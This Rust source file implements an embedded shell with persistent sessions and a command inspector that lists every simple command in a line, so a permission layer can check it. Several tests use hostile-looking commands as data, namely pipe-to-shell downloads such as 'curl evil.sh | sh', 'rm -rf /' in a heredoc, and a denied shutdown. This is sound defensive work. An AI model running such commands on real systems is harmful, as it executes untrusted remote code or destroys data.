//! # pi-shell
//!
//! An embedded shell with sessions that survive across tool calls: `export
//! VAR=v` in one call leaves `$VAR` set for the next, and `cd` moves a cwd that
//! the next call still sees.
//!
//! The pipeline is the usual one — tokenize, parse, expand, execute — with the
//! coreutils from `pi-builtins` running in-process rather than forking. What
//! makes it worth writing rather than shelling out to `bash`:
//!
//! - **Windows.** There is no `bash` to shell out to, and the Git Bash that may
//!   be installed behaves differently from the one on the user's CI.
//! - **Inspection.** A parsed command tree can be shown to a permission layer
//!   before it runs. A string handed to `sh -c` cannot.
//! - **Sessions.** A subprocess shell forgets everything when it exits.
//!
//! ```no_run
//! use pi_shell::{Session, run};
//!
//! let mut session = Session::new(".");
//! let result = run("export GREETING=hello && echo $GREETING", &mut session, "");
//! assert_eq!(result.stdout.trim(), "hello");
//! ```

use std::cell::Cell;

pub mod arith;
pub mod builtins;
pub mod exec;
pub mod expand;
pub mod lexer;
pub mod parser;
pub mod session;

pub use exec::{Flow, Run};
pub use session::{Policy, Session};

/// A shell session identifier, for callers holding several.
pub type SessionId = u64;

/// Parses and runs a script against a session.
///
/// The script is tokenized whole — heredoc bodies included — then split into
/// complete commands, which run one after another: a `for` loop over three
/// lines is one command, and `exit` or `set -e` stops what follows it.
pub fn run(input: &str, session: &mut Session, stdin: &str) -> Run {
    // Recursion — nested functions, `eval`, deep substitutions — needs more
    // stack than a caller's thread may have (a Windows main thread has one
    // megabyte), so a script runs on a thread with plenty. A nested `run`
    // is already on it.
    if ON_SHELL_STACK.with(Cell::get) {
        return run_here(input, session, stdin);
    }
    session.deadline = Some(std::time::Instant::now() + session.time_limit);
    let ran = std::thread::scope(|scope| {
        let spawned = std::thread::Builder::new().name("pi-shell".into()).stack_size(SHELL_STACK).spawn_scoped(scope, || {
            ON_SHELL_STACK.with(|on| on.set(true));
            run_here(input, &mut *session, stdin)
        });
        spawned.ok().map(|handle| {
            handle.join().unwrap_or_else(|_| Run {
                stderr: "pi-shell: the script crashed the shell
".to_string(),
                code: 2,
                fatal: true,
                ..Default::default()
            })
        })
    });
    // No thread to be had: run here, on whatever stack there is.
    ran.unwrap_or_else(|| run_here(input, session, stdin))
}

/// The stack a script runs on.
const SHELL_STACK: usize = 64 * 1024 * 1024;

thread_local! {
    static ON_SHELL_STACK: Cell<bool> = const { Cell::new(false) };
}

fn run_here(input: &str, session: &mut Session, stdin: &str) -> Run {
    let mut result = Run::default();

    let tokens = match lexer::tokenize(input) {
        Ok(tokens) => tokens,
        Err(message) => {
            result.stderr.push_str(&format!("syntax error: {message}\n"));
            result.code = 2;
            return result;
        }
    };

    for chunk in complete_commands(tokens) {
        let tree = match parser::parse(&chunk) {
            Ok(Some(tree)) => tree,
            Ok(None) => continue,
            Err(message) => {
                result.stderr.push_str(&format!("syntax error: {message}\n"));
                result.code = 2;
                return result;
            }
        };

        let step = exec::run(&tree, session, stdin);
        result.stdout.push_str(&step.stdout);
        result.stderr.push_str(&step.stderr);
        result.code = step.code;
        result.refused.extend(step.refused);
        result.jobs.extend(step.jobs);
        result.fatal |= step.fatal;
        // A `return` in a sourced script ends it; a stray `break` ends nothing.
        if step.flow == Some(Flow::Return) {
            result.flow = step.flow;
            break;
        }

        if session.exited.is_some() {
            break;
        }
    }

    result
}

/// Splits a script's tokens into complete commands at the newlines that end
/// one — not those inside a construct (`if` … `fi`, `{` … `}`, `(` … `)`),
/// nor those after an operator that needs its right side (`|`, `&&`, `||`).
fn complete_commands(tokens: Vec<lexer::Token>) -> Vec<Vec<lexer::Token>> {
    use lexer::Token;

    /// Where a `case` is: before `in`, at a pattern, or in an arm's body.
    #[derive(Clone, Copy, PartialEq)]
    enum Case {
        Subject,
        Pattern,
        Body,
    }

    let mut chunks = Vec::new();
    let mut current: Vec<Token> = Vec::new();
    let mut depth: i32 = 0;
    // Whether the next word is where a command starts, which is the only
    // place a reserved word is one.
    let mut command_start = true;
    // `function name` puts the body's `{` right after the name.
    let mut after_function = 0;
    // Open `case`s: a pattern's `)` closes the pattern, not a subshell.
    let mut cases: Vec<Case> = Vec::new();

    for token in tokens {
        let in_pattern = cases.last() == Some(&Case::Pattern);
        match &token {
            Token::Newline => {
                let continues = matches!(current.last(), Some(Token::Pipe | Token::And | Token::Or));
                if depth <= 0 && !continues {
                    if !current.is_empty() {
                        chunks.push(std::mem::take(&mut current));
                    }
                    command_start = true;
                    depth = 0;
                    cases.clear();
                    continue;
                }
                command_start = true;
            }
            Token::OpenParen if in_pattern => {}
            Token::CloseParen if in_pattern => {
                if let Some(state) = cases.last_mut() {
                    *state = Case::Body;
                }
                command_start = true;
            }
            Token::OpenParen => {
                depth += 1;
                command_start = true;
            }
            Token::CloseParen => {
                depth -= 1;
                command_start = true;
            }
            Token::CaseEnd => {
                if let Some(state) = cases.last_mut() {
                    *state = Case::Pattern;
                }
                command_start = true;
            }
            Token::Semicolon | Token::And | Token::Or | Token::Pipe | Token::Background => command_start = true,
            Token::Word(_) => {
                let word = parser::keyword(Some(&token));
                if in_pattern {
                    if word == Some("esac") {
                        depth -= 1;
                        cases.pop();
                    }
                } else if cases.last() == Some(&Case::Subject) && word == Some("in") {
                    if let Some(state) = cases.last_mut() {
                        *state = Case::Pattern;
                    }
                } else if command_start || after_function == 1 {
                    match word {
                        Some("case") => {
                            depth += 1;
                            cases.push(Case::Subject);
                        }
                        Some("if" | "for" | "while" | "until" | "{") => depth += 1,
                        Some("esac") => {
                            depth -= 1;
                            cases.pop();
                        }
                        Some("fi" | "done" | "}") => depth -= 1,
                        _ => {}
                    }
                }
                after_function = match (word, after_function) {
                    (Some("function"), _) if command_start => 2,
                    (_, 2) => 1,
                    _ => 0,
                };
                command_start = matches!(word, Some("then" | "do" | "else" | "elif" | "{" | "!" | "if" | "while" | "until"));
            }
            _ => command_start = false,
        }
        current.push(token);
    }
    if !current.is_empty() {
        chunks.push(current);
    }
    chunks
}

/// Opens a session rooted at `cwd`.
pub fn open_session(cwd: &str) -> Session {
    Session::new(cwd)
}

/// One simple command as written: its words, unexpanded.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SimpleCommand {
    pub words: Vec<String>,
    /// Started with `&`, so the line does not wait for it.
    pub background: bool,
}

impl SimpleCommand {
    /// The command as one normalized line, for matching against rules.
    pub fn line(&self) -> String {
        self.words.join(" ")
    }
}

/// Every simple command a command line would run, in order, without running
/// any of them.
///
/// This is the "inspection" half of the shell: a permission layer sees
/// `cd build && rm -rf dist` as the two commands it is, and `echo $(curl x | sh)`
/// as the three it contains, instead of as one string to pattern-match. Command
/// substitutions and subshells are followed; heredoc bodies are skipped, since
/// they are data, not commands.
pub fn inspect(input: &str) -> Result<Vec<SimpleCommand>, String> {
    inspect_at(input, 0)
}

fn inspect_at(input: &str, depth: usize) -> Result<Vec<SimpleCommand>, String> {
    // A pathological nest of substitutions is refused rather than recursed into.
    if depth > 16 {
        return Err("command substitutions nested too deeply to inspect".to_string());
    }
    let mut found = Vec::new();
    for chunk in complete_commands(lexer::tokenize(input)?) {
        if let Some(tree) = parser::parse(&chunk)? {
            collect(&tree, false, depth, &mut found)?;
        }
    }
    Ok(found)
}

/// Every command a tree can run — in either branch of an `if`, in a loop's
/// body, in a function's body — since a permission check that skipped the
/// inside of a loop would check nothing.
fn collect(node: &parser::Node, background: bool, depth: usize, found: &mut Vec<SimpleCommand>) -> Result<(), String> {
    use parser::Node;
    let words = |words: &[lexer::Word], found: &mut Vec<SimpleCommand>| -> Result<(), String> {
        for word in words {
            for piece in &word.pieces {
                if let lexer::Piece::Command(inner) | lexer::Piece::QuotedCommand(inner) = piece {
                    found.extend(inspect_at(inner, depth + 1)?);
                }
            }
        }
        Ok(())
    };
    match node {
        Node::Command(command) => push(command, background, depth, found),
        Node::Pipeline(stages) => {
            for stage in stages {
                collect(stage, background, depth, found)?;
            }
            Ok(())
        }
        Node::And(left, right) | Node::Or(left, right) | Node::Sequence(left, right) => {
            collect(left, background, depth, found)?;
            collect(right, background, depth, found)
        }
        Node::Background(inner) => collect(inner, true, depth, found),
        Node::Subshell(inner) | Node::Not(inner) | Node::Group(inner) => collect(inner, background, depth, found),
        Node::Function { body, .. } => collect(body, background, depth, found),
        Node::For { items, body, .. } => {
            if let Some(items) = items {
                words(items, found)?;
            }
            collect(body, background, depth, found)
        }
        Node::Loop { condition, body, .. } => {
            collect(condition, background, depth, found)?;
            collect(body, background, depth, found)
        }
        Node::If { branches, otherwise } => {
            for (condition, body) in branches {
                collect(condition, background, depth, found)?;
                collect(body, background, depth, found)?;
            }
            match otherwise {
                Some(body) => collect(body, background, depth, found),
                None => Ok(()),
            }
        }
        Node::Case { subject, arms } => {
            words(std::slice::from_ref(subject), found)?;
            for arm in arms {
                if let Some(body) = &arm.body {
                    collect(body, background, depth, found)?;
                }
            }
            Ok(())
        }
        Node::Redirected(inner, redirects) => {
            for redirect in redirects {
                if let parser::Redirect::In(word) | parser::Redirect::Out(word) | parser::Redirect::Append(word) | parser::Redirect::Err(word) | parser::Redirect::HereString(word) = redirect {
                    words(std::slice::from_ref(word), found)?;
                }
            }
            collect(inner, background, depth, found)
        }
    }
}

fn push(
    command: &parser::Command,
    background: bool,
    depth: usize,
    found: &mut Vec<SimpleCommand>,
) -> Result<(), String> {
    // A substitution runs before the command that contains it.
    let words = command
        .assignments
        .iter()
        .map(|(_, word)| word)
        .chain(command.words.iter());
    for word in words {
        for piece in &word.pieces {
            if let lexer::Piece::Command(inner) | lexer::Piece::QuotedCommand(inner) = piece {
                found.extend(inspect_at(inner, depth + 1)?);
            }
        }
    }
    if !command.words.is_empty() {
        found.push(SimpleCommand {
            words: command.words.iter().map(lexer::Word::as_literal).collect(),
            background,
        });
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn shell() -> Session {
        let mut session = Session::new(std::env::temp_dir());
        session.policy = Policy::unrestricted();
        session
    }

    fn out(input: &str) -> String {
        let mut session = shell();
        run(input, &mut session, "").stdout
    }

    #[test]
    fn runs_a_builtin() {
        assert_eq!(out("echo hello"), "hello\n");
    }

    #[test]
    fn pipelines_pass_stdout_along() {
        assert_eq!(out("echo -n 'a\nb\nc' | wc -l").trim(), "3");
        assert_eq!(out("echo 'b\na' | sort").trim(), "a\nb");
    }

    #[test]
    fn and_short_circuits_on_failure() {
        assert_eq!(out("false && echo unreachable"), "");
        assert_eq!(out("true && echo reached"), "reached\n");
    }

    #[test]
    fn or_runs_only_after_a_failure() {
        assert_eq!(out("false || echo recovered"), "recovered\n");
        assert_eq!(out("true || echo unreachable"), "");
    }

    #[test]
    fn variables_survive_between_calls() {
        // The reason this crate exists.
        let mut session = shell();
        run("export GREETING=hello", &mut session, "");
        assert_eq!(run("echo $GREETING", &mut session, "").stdout, "hello\n");
    }

    #[test]
    fn cd_persists_between_calls() {
        let mut session = shell();
        let temp = std::env::temp_dir();
        run(&format!("cd {}", temp.display()), &mut session, "");
        let after = run("pwd", &mut session, "").stdout;
        assert!(!after.trim().is_empty());
    }

    #[test]
    fn a_subshell_does_not_leak_its_cd() {
        let mut session = shell();
        let before = run("pwd", &mut session, "").stdout;
        run("(cd / && pwd)", &mut session, "");
        let after = run("pwd", &mut session, "").stdout;
        assert_eq!(before, after);
    }

    #[test]
    fn per_command_assignments_do_not_persist() {
        let mut session = shell();
        run("FOO=temporary echo x", &mut session, "");
        assert_eq!(run("echo [$FOO]", &mut session, "").stdout, "[]\n");
    }

    #[test]
    fn exit_status_is_visible_as_a_variable() {
        let mut session = shell();
        run("false", &mut session, "");
        assert_eq!(run("echo $?", &mut session, "").stdout, "1\n");
        run("true", &mut session, "");
        assert_eq!(run("echo $?", &mut session, "").stdout, "0\n");
    }

    #[test]
    fn command_substitution_runs_and_strips_trailing_newlines() {
        assert_eq!(out("echo $(echo inner)"), "inner\n");
        // Without the strip, this would be "a\n b".
        assert_eq!(out("echo $(echo a) b"), "a b\n");
    }

    #[test]
    fn arithmetic_expansion() {
        assert_eq!(out("echo $((2 + 3 * 4))"), "14\n");
    }

    #[test]
    fn redirection_writes_and_appends() {
        let mut session = shell();
        let path = std::env::temp_dir().join(format!("pi-shell-{}.txt", std::process::id()));
        let path = path.display().to_string().replace('\\', "/");

        run(&format!("echo first > '{path}'"), &mut session, "");
        run(&format!("echo second >> '{path}'"), &mut session, "");

        let content = std::fs::read_to_string(&path).unwrap();
        assert_eq!(content, "first\nsecond\n");
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn input_redirection_reads_a_file() {
        let mut session = shell();
        let path = std::env::temp_dir().join(format!("pi-shell-in-{}.txt", std::process::id()));
        std::fs::write(&path, "x\ny\nz\n").unwrap();
        let quoted = path.display().to_string().replace('\\', "/");

        let result = run(&format!("wc -l < '{quoted}'"), &mut session, "");
        assert_eq!(result.stdout.trim(), "3");
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn stderr_is_separate_unless_merged() {
        let mut session = shell();
        let plain = run("definitely-not-a-command", &mut session, "");
        assert!(plain.stdout.is_empty());
        assert!(!plain.stderr.is_empty());

        let merged = run("definitely-not-a-command 2>&1", &mut session, "");
        assert!(!merged.stdout.is_empty());
        assert!(merged.stderr.is_empty());
    }

    #[test]
    fn a_heredoc_becomes_stdin() {
        let mut session = shell();
        let result = run("wc -l << EOF\none\ntwo\nEOF", &mut session, "");
        assert_eq!(result.stdout.trim(), "2");
    }

    #[test]
    fn a_newline_inside_quotes_does_not_end_the_command() {
        let mut session = shell();
        let result = run("echo 'line one\nline two'", &mut session, "");
        assert!(result.stdout.contains("line one"));
        assert!(result.stdout.contains("line two"));
    }

    #[test]
    fn quoting_keeps_a_path_with_spaces_as_one_argument() {
        assert_eq!(out(r#"echo "a b" c"#), "a b c\n");
    }

    #[test]
    fn a_syntax_error_reports_rather_than_running_half() {
        let mut session = shell();
        let result = run("echo 'unterminated", &mut session, "");
        assert_eq!(result.code, 2);
        assert!(result.stderr.contains("syntax error"));
    }

    #[test]
    fn an_unknown_command_reports_127() {
        let mut session = shell();
        assert_eq!(run("definitely-not-a-command", &mut session, "").code, 127);
    }

    #[test]
    fn policy_refuses_a_denied_command() {
        let mut session = Session::new(std::env::temp_dir());
        let result = run("shutdown -h now", &mut session, "");
        assert_eq!(result.code, 126);
        assert_eq!(result.refused.len(), 1);
    }

    #[test]
    fn a_confined_session_refuses_to_leave_its_root() {
        let temp = std::env::temp_dir();
        let mut session = Session::new(&temp);
        session.policy = Policy::confined(&temp);
        let result = run("cd /", &mut session, "");
        assert_ne!(result.code, 0);
    }

    #[test]
    fn aliases_expand_once() {
        let mut session = shell();
        run("alias greet='echo hello'", &mut session, "");
        assert_eq!(run("greet", &mut session, "").stdout, "hello\n");
    }

    #[test]
    fn a_self_referential_alias_does_not_loop() {
        // `alias ls='ls -la'` is the standard one, and a naive expander hangs.
        let mut session = shell();
        run("alias echo='echo -n'", &mut session, "");
        let result = run("echo x", &mut session, "");
        assert!(result.code != 0 || result.stdout.contains('x'));
    }

    #[test]
    fn multiple_lines_run_in_order() {
        assert_eq!(out("echo one\necho two"), "one\ntwo\n");
    }

    #[test]
    fn a_comment_does_not_run() {
        assert_eq!(out("echo visible # echo hidden"), "visible\n");
    }

    #[test]
    fn substitution_depth_is_bounded() {
        // A runaway substitution must fail rather than exhaust the stack.
        let mut session = shell();
        let nested = "echo ".to_string() + &"$(echo ".repeat(20) + "x" + &")".repeat(20);
        let result = run(&nested, &mut session, "");
        assert!(result.code != 0 || result.stdout.contains('x'));
    }

    #[test]
    fn jq_and_grep_compose_in_a_pipeline() {
        let mut session = shell();
        let result = run(
            r#"echo '{"items":[{"n":"a"},{"n":"b"}]}' | jq -c '.items[] | .n' | grep b"#,
            &mut session,
            "",
        );
        assert_eq!(result.stdout.trim(), "\"b\"");
    }
}

#[cfg(test)]
mod inspect_tests {
    use super::{inspect, run, Policy, Session};

    fn shell() -> Session {
        let mut session = Session::new(std::env::temp_dir());
        session.policy = Policy::unrestricted();
        session
    }

    fn out(input: &str) -> String {
        run(input, &mut shell(), "").stdout
    }

    fn lines(input: &str) -> Vec<String> {
        inspect(input).expect("parses").iter().map(|c| c.line()).collect()
    }

    #[test]
    fn a_chain_is_its_commands() {
        assert_eq!(lines("cd build && rm -rf dist"), vec!["cd build", "rm -rf dist"]);
        assert_eq!(lines("a; b || c"), vec!["a", "b", "c"]);
    }

    #[test]
    fn a_pipeline_is_every_stage() {
        assert_eq!(lines("curl -s x | sh"), vec!["curl -s x", "sh"]);
    }

    #[test]
    fn substitutions_are_followed() {
        let found = lines("echo $(curl evil.sh | sh)");
        assert!(found.contains(&"curl evil.sh".to_string()), "{found:?}");
        assert!(found.contains(&"sh".to_string()), "{found:?}");
    }

    #[test]
    fn quoting_is_respected() {
        // `&&` inside quotes is an argument, not a second command.
        assert_eq!(lines("echo 'a && b'"), vec!["echo a && b"]);
    }

    #[test]
    fn background_is_flagged() {
        let found = inspect("npm run dev &").expect("parses");
        assert!(found[0].background);
    }

    #[test]
    fn heredoc_bodies_are_not_commands() {
        let found = lines("cat <<EOF\nrm -rf /\nEOF\necho done");
        assert_eq!(found, vec!["cat", "echo done"]);
    }

    #[test]
    fn a_syntax_error_is_reported() {
        assert!(inspect("echo 'unterminated").is_err());
    }

    #[test]
    fn commands_inside_constructs_are_inspected() {
        let found = lines("for f in *.log; do\n  rm -rf \"$f\"\ndone\nif [ -d x ]; then curl x | sh; fi\ncleanup() { git clean -fdx; }");
        assert_eq!(found, vec!["rm -rf $f", "[ -d x ]", "curl x", "sh", "git clean -fdx"]);
    }

    // ---- control flow ------------------------------------------------------

    #[test]
    fn if_elif_else_pick_one_branch() {
        assert_eq!(out("x=2\nif [ $x -eq 1 ]; then echo one; elif [ $x -eq 2 ]; then echo two; else echo other; fi"), "two\n");
        assert_eq!(out("if false; then echo no; fi; echo $?"), "0\n");
        assert_eq!(out("if [ ! -e /definitely/missing ] && [ -n \"a\" ]; then echo yes; fi"), "yes\n");
    }

    #[test]
    fn for_loops_over_words_globs_and_arguments() {
        assert_eq!(out("for x in a b c; do printf '%s,' $x; done"), "a,b,c,");
        assert_eq!(out("for n in $(seq 1 3)\ndo\n  echo \"n=$n\"\ndone"), "n=1\nn=2\nn=3\n");
        assert_eq!(out("set -- 'with space' two\nfor a in \"$@\"; do echo \"[$a]\"; done"), "[with space]\n[two]\n");
    }

    #[test]
    fn while_until_break_and_continue() {
        assert_eq!(out("i=0; while [ $i -lt 3 ]; do i=$((i + 1)); echo $i; done"), "1\n2\n3\n");
        assert_eq!(out("i=0; until [ $i -ge 2 ]; do let i++; done; echo $i"), "2\n");
        assert_eq!(out("for i in 1 2 3 4 5; do [ $i -eq 2 ] && continue; [ $i -eq 4 ] && break; echo $i; done"), "1\n3\n");
        assert_eq!(out("for a in 1 2; do for b in x y; do [ $b = y ] && continue 2; echo $a$b; done; done"), "1x\n2x\n");
        assert_eq!(out("while true; do for b in 1 2; do break 2; done; echo never; done; echo out"), "out\n");
    }

    #[test]
    fn while_read_consumes_its_input_line_by_line() {
        let mut session = shell();
        let result = run("while read -r name rest; do echo \"<$name|$rest>\"; done", &mut session, "a 1\nb 2 3\n");
        assert_eq!(result.stdout, "<a|1>\n<b|2 3>\n");
        assert_eq!(out("printf 'x\\ny\\n' | while read line; do echo got $line; done"), "got x\ngot y\n");
        assert_eq!(out("while read l; do echo $l; done <<EOF\none\ntwo\nEOF"), "one\ntwo\n");
        assert_eq!(out("read a b <<< 'first second third'; echo $b"), "second third\n");
    }

    #[test]
    fn case_matches_patterns() {
        let script = "for f in main.rs app.ts README; do\n  case $f in\n    *.rs) echo rust ;;\n    *.ts|*.js) echo script ;;\n    *) echo other ;;\n  esac\ndone";
        assert_eq!(out(script), "rust\nscript\nother\n");
    }

    #[test]
    fn functions_take_arguments_locals_and_return() {
        let script = "x=outer\ngreet() {\n  local x=inner\n  echo \"hello $1 ($#) $x\"\n  return 3\n}\ngreet world extra\necho \"status=$? x=$x\"";
        assert_eq!(out(script), "hello world (2) inner\nstatus=3 x=outer\n");
        assert_eq!(out("fact() { if [ $1 -le 1 ]; then echo 1; else echo $(( $1 * $(fact $(( $1 - 1 ))) )); fi; }; fact 5"), "120\n");
        assert_eq!(out("function shout { echo \"$@!\"; }; shout hey there"), "hey there!\n");
    }

    #[test]
    fn set_e_stops_at_the_first_failure_outside_a_condition() {
        assert_eq!(out("set -e\nif false; then echo no; fi\nfalse || echo recovered\nfalse\necho unreachable"), "recovered\n");
        let mut session = shell();
        assert_eq!(run("set -euo pipefail\nfalse | true", &mut session, "").code, 1);
    }

    #[test]
    fn arithmetic_uses_bare_names() {
        assert_eq!(out("count=4; echo $((count * 2 + 1))"), "9\n");
        assert_eq!(out("let 'x = 3 ** 2'; echo $x"), "9\n");
        assert_eq!(out("echo $(( 7 % 3 )) $(( 10 / 4 ))"), "1 2\n");
    }

    #[test]
    fn double_brackets_do_not_glob_or_split() {
        assert_eq!(out("f='my file.rs'; [[ $f == *.rs ]] && echo match"), "match\n");
        assert_eq!(out("[[ abc =~ ^a.c$ ]] && echo regex"), "regex\n");
    }

    #[test]
    fn printf_groups_and_redirected_compounds() {
        assert_eq!(out("printf '%-4s|%03d\\n' ab 7"), "ab  |007\n");
        let dir = std::env::temp_dir().join(format!("pi-shell-group-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let mut session = Session::new(&dir);
        session.policy = Policy::unrestricted();
        run("{ echo a; echo b; } > both.txt\nfor i in 1 2; do echo $i; done >> both.txt", &mut session, "");
        assert_eq!(std::fs::read_to_string(dir.join("both.txt")).unwrap(), "a\nb\n1\n2\n");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_runaway_loop_is_stopped_and_a_quoted_heredoc_is_literal() {
        assert_eq!(out("x=1; cat <<'EOF'\n$x stays\nEOF"), "$x stays\n");
        assert_eq!(out("x=1; cat <<EOF\n$x expands\nEOF"), "1 expands\n");
        assert!(out("f() { f; }; f").is_empty());
    }
}
